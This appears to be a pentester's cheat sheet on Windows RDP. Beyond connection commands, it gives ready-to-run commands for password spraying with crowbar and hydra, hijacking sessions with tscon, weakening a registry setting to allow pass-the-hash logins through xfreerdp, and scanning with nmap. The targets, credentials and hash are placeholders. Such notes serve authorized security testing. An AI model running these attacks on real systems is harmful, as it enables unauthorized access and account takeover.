# RDP

## About

<mark style="color:red;">**Remote Desktop Protocol (RDP)**</mark> is a <mark style="color:purple;">**protocol**</mark> developed by **Microsoft** for remote access to a computer running the Windows OS. This protocol allows display and control commands to be transmitted via the **GUI** encrypted over **IP** networks. Works at <mark style="color:yellow;">**Application Layer**</mark> of **TCP/IP model**, typically using <mark style="color:yellow;">**TCP/3389 port.**</mark>  If **Network Address Translation (NAT)** is used on the route between client and server, as is often the case with Internet connections, the remote computer needs the public IP address to reach the server. It uses <mark style="color:yellow;">**TLS/SSL.**</mark>

## Connecting

#### Rdesktop

```bash
rdesktop -u carni17 -p 'amogus' -d domain.kek 13.13.13.13
```

#### Xfreerdp

```bash
xfreerdp /u:carni17 /p:amogus /v:13.13.13.13 /d:domain.kek /cert:ignore
```

#### Remmina (GUI)

```bash
reminna
```

## Password Spraying

#### Crowbar

```bash
crowbar -b rdp -s 13.13.13.13/32 -U users.txt -c 'amogus'
```

#### Hydra

```bash
hydra -L users.txt -p 'amogus' 13.13.13.13 rdp
```

## Session Hijacking

<mark style="color:orange;">**We need SYSTEM privileges**</mark> and use <mark style="color:green;">**tscon.exe**</mark> (allows to connect to another desktop session) [**\[LINK\]**](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/tscon)

```powershell
tscon 13 /dest:CARN3
```

## Pass-The-Hash

By default, Windows has disabled <mark style="color:green;">**`Restricted Admin Mode`**</mark>, and we need to fix that by adding new registry key to <mark style="color:green;">**`DisableRestrictedAdmin`**</mark>

```powershell
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

And then to use <mark style="color:green;">**xfreerdp**</mark> for Pass The Hash

```powershell
xfreerdp /v:13.13.13.13 /u:carni7 /pth:12379NSKDFKSJDF20931C031
```

## Tips2Hack

1. **Nmap RDP Scan**

```bash
nmap -sV -sC 13.13.13.13 -p3389 --script rdp*
```

2. **RDP Security Check** [**\[LINK\]**](https://github.com/CiscoCXSecurity/rdp-sec-check)

```bash
./rdp-sec-check.pl 13.13.13.13
```

3. Initiate an **RDP** Session via <mark style="color:green;">**xfreerdp**</mark> (or <mark style="color:green;">**Remmina**</mark> with GUI)

```bash
xfreerdp /u:carni17 /p:"amogus" /v:13.13.13.13 /cert:ignore /d:DOMAIN
```

***
